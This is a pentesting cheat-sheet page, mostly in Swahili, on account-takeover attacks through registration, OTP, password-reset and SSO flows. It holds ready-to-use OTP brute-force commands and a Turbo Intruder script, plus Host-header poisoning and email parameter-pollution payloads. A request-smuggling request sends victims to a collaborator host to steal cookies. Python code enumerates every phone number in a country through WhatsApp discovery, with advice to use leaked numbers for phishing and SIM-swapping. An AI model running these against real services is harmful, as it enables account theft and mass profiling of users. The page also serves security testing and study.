# Udhaifu wa Usajili na Kunyakua Akaunti

{{#include ../banners/hacktricks-training.md}}

## Kunyakua Akaunti kwa Usajili

### Usajili Rudufu

- Jaribu kuunda ukitumia existing username
- Angalia kubadilisha email:
- herufi kubwa
- +1@
- ongeza nukta kwenye email
- special characters katika sehemu ya jina la email (%00, %09, %20)
- Weka whitespace baada ya email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Jaribu mbinu za canonicalization za provider wa email (zinategemea huduma):
- Gmail haizingatii nukta na subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` huwasilisha kwa `victim@gmail.com`
- Baadhi ya providers hawazingatii case katika local-part
- Baadhi ya providers wanakubali unicode confusables. Jaribu homoglyphs na soft hyphen `\u00AD` ndani ya local-part
- Tumia mbaya haya ili: kuepuka ukaguzi wa kipekee, kupata duplicate accounts/workspace invites, au kuzuia sign‑ups za mwathiri (DoS ya muda) wakati unajiandaa kunyakua akaunti

### Utafutaji wa username

Angalia kama unaweza kubaini wakati username tayari imejisajili ndani ya application.

- Ujumbe tofauti za kosa au HTTP status codes
- Tofauti za muda (mtumiaji aliyepo anaweza kusababisha lookup kwa IdP/DB)
- Formu ya usajili kujazwa moja kwa moja data za profile kwa emails zinazoonekana
- Kagua team/invite flows: kuingiza email kunaweza kufichua kama akaunti ipo

### Sera ya Password

Unapounda mtumiaji angalia sera ya password (angalia kama unaweza kutumia weak passwords).  
Katika hali hiyo unaweza kujaribu bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Badilisha Email

Baada ya kusajiliwa jaribu kubadilisha email na angalia kama mabadiliko yanaidhinishwa ipasavyo au kama unaweza kuibadilisha kuwa arbitrary emails.

### Vidokezo vya Zaidi

- Angalia kama unaweza kutumia **disposable emails** (mailinator, yopmail, 1secmail, etc.) au kupitisha blocklist kwa subaddressing kama `victim+mailinator@gmail.com`
- **Long** **password** (>200) inaweza kusababisha **DoS**
- **Angalia rate limits kwenye account creation**
- Tumia username@**burp_collab**.net na uchambue **callback**
- Ikiwa phone number verification inatumika, angalia edge cases za phone parsing/injection

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Ugunduzi wa Mawasiliano / oracles za Uorodheshaji wa Vitambulisho

Wapeperushaji wa ujumbe wanaotegemea namba za simu huweka wazi **presence oracle** kila mteja anaposync contacts. Kurudia requests za discovery za WhatsApp kihistoria zilipelekea **>100M lookups per hour**, kuruhusu uorodheshaji wa akaunti karibu kamili.

Mfano wa shambulio

1. **Tumia client rasmi** ili kunasa request ya upload ya address-book (authenticated blob ya namba zilizoongezwa kwa normalization E.164). Re-play na namba zilizotengenezwa na mshambuliaji ukiendelea kutumia cookies/token ya kifaa ile ile.
2. **Tuma namba nyingi kwa kila request**: WhatsApp inakubali maelfu ya vitambulisho na inarejesha registered/unregistered pamoja na metadata (business, companion, n.k.). Changanua majibu offline kujenga orodha za walengwa bila kutuma ujumbe kwa wahasiriwa.
3. **Sambaza kwa upana (horizontally scale)** uorodheshaji kwa SIM banks, cloud devices, au residential proxies ili throttling kwa akaunti/IP/ASN isiwashwe.

Modeli ya mpango wa kupiga simu

Fanyia modeli mpango wa kupiga simu wa kila nchi ili kupitisha wagombea wasio halali. The NDSS dataset (`country-table.*`) inaorodhesha country codes, adoption density, na platform split ili uweze kuipa kipaumbele ranges zenye high-hit. Mfano wa code ya seeding:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Toa kipaumbele kwa prefixes zinazolingana na mgawanyo halisi (Mobile Country Code + National Destination Code) kabla ya kuuliza oracle ili throughput ibaki ya maana.

**Turning enumerations into targeted attacks**

- Weka leaked phone numbers (mfano, Facebook’s 2021 breach) kwenye oracle ili kujua ni vitambulisho gani bado viko hai kabla ya phishing, SIM-swapping, au spamming.
- Chambua censuses kwa nchi/OS/aina ya app ili kugundua mikoa yenye uchujaji dhaifu wa SMS au matumizi makubwa ya WhatsApp Business kwa localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Omba identity material kwa kila nambari uliyoenumerate na ondokana na duplicate ya public keys ili kufichua account farms, cloned clients, au insecure firmware—shared keys huondoa utambulisho wa operesheni za multi-SIM.

## Uthibitisho dhaifu wa Barua pepe/Simu (OTP/Magic Link)

Mtiririko ya usajili mara nyingi huhakikisha umiliki kupitia numeric OTP au magic-link token. Makosa ya kawaida:

- OTP inayoweza kukadiriwa au fupi (4–6 digits) bila rate limiting madhubuti au IP/device tracking. Jaribu parallel guesses na header/IP rotation.
- OTP reuse across actions au accounts, au haifungwi kwa mtumiaji/kitendo maalum (mfano, same code inafanya kazi kwa login na signup, au inafanya kazi baada ya email kubadilishwa).
- Multi-value smuggling: baadhi ya backends zinakubali multiple codes na kuhakiki ikiwa yoyote inalingana. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: tofautisha wrong vs expired vs wrong-user codes kwa status/message/body length.
- Tokens not invalidated after success au baada ya password/email change.
- Verification token not tied to user agent/IP, kuruhusu cross-origin completion kutoka kurasa zinazodhibitiwa na mshambuliaji.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Kukisia sambamba ili kuepuka kufungwa kwa mfuatano (tumia Turbo Intruder katika Burp):

<details>
<summary>Sehemu ya Turbo Intruder ya kufurika majaribio ya OTP ya tarakimu 6</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (kabla ya mwathiriwa kujisajili)

Daraja zenye nguvu za matatizo hutokea wakati mshambuliaji anafanya vitendo kwenye barua pepe ya mwathiriwa kabla mwathiriwa hajaunda akaunti yake, kisha anapata tena ufikiaji baadaye.

Key techniques to test (adjust kwa mtiririko wa lengo):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Vidokezo vya vitendo

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
- all other sessions and tokens are invalidated,
- pending email/phone change capabilities are cancelled,
- previously linked IdPs/emails/phones are re‑verified.

Kumbuka: Methodology kubwa na case studies za tekniki hizi zimeandikwa katika Microsoft’s pre‑hijacking research (angalia References mwishoni).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Mshambuliaji lazima aingie kwa akaunti yake na aende kwenye kipengele cha **Change password**.
2. Anzisha Burp Suite na ukamate request
3. Ipeleke kwenye tab ya repeater na uhariri vigezo: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Password reset token inapaswa kuzalishwa kwa bahati nasibu na kuwa ya kipekee kila mara.\
Jaribu kubaini kama token inatoweka au ikiwa ni ile ile kila mara; katika baadhi ya kesi algorithimu ya uzalishaji ni dhaifu na inaweza kukadiriwa. Vigezo vifuatavyo vinaweza kutumiwa na algorithm.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Sababisha ombi la password reset kwa kutumia API/UI kwa barua pepe maalum e.g: test@mail.com
2. Kagua majibu ya server na angalia `resetToken`
3. Kisha tumia token hiyo ndani ya URL kama `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Jisajili kwenye mfumo kwa username inayofanana kabisa na ya mwathiriwa, lakini ukiweka nafasi tupu kabla na/au baada ya username. e.g: `"admin "`
2. Omba password reset kwa kutumia username yako ya uharibu.
3. Tumia token iliyotumwa kwa barua pepe yako na uweke upya nywila ya mwathiriwa.
4. Ingia kwenye akaunti ya mwathiriwa kwa nywila mpya.

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Tafuta XSS ndani ya application au subdomain ikiwa cookies zimepangwa kwa domain kuu: `*.domain.com`
2. Leak the current **sessions cookie**
3. Thibitisha kama mtumiaji kwa kutumia cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Tumia **smuggler** kugundua aina ya HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Tengeneza request itakayobadilisha `POST / HTTP/1.1` na data ifuatayo:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` lengo likiwa la kufungua redirect wa waathiriwa kwenda burpcollab na kuiba cookie zao\
3. Ombi la mwisho linaweza kuonekana kama ifuatavyo
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Ripoti za Hackerone kuhusu kutumia bug hii\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Kuiba Akaunti kupitia CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Tengeneza payload kwa CSRF, e.g: “HTML form with auto submit for a password change”
2. Tuma payload

### Kuiba Akaunti kupitia JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token inaweza kutumika kuthibitisha mtumiaji.

- Hariri JWT ukitumia User ID / Email tofauti
- Angalia kama saini ya JWT ni dhaifu


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Usajili-kama-Reset (Upsert on Existing Email)

Baadhi ya signup handlers hufanya upsert wakati email iliyotolewa tayari inapatikana. Ikiwa endpoint inakubali minimal body yenye email na password na haitekelezi uthibitisho wa umiliki, kutuma email ya mhusika kutaandika juu ya password yao pre-auth.

- Ugunduzi: harvest endpoint names kutoka bundled JS (au mobile app traffic), kisha fuzz base paths kama /parents/application/v4/admin/FUZZ ukitumia ffuf/dirsearch.
- Vidokezo vya method: GET inayorejesha ujumbe kama "Only POST request is allowed." mara nyingi inaonyesha verb sahihi na kwamba JSON body inatarajiwa.
- Minimal body iliyobonwa katika mazingira halisi:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Mfano PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Athari: Kukamatwa Kamili kwa Akaunti (ATO) bila reset token, OTP, au uthibitishaji wa barua pepe.

## Marejeo

- [Jinsi Nilivyogundua Mdudu Mkali wa Password Reset (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Halo! Unatumia WhatsApp: Kuorodhesha Akaunti Bilioni Tatu kwa Usalama na Faragha (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
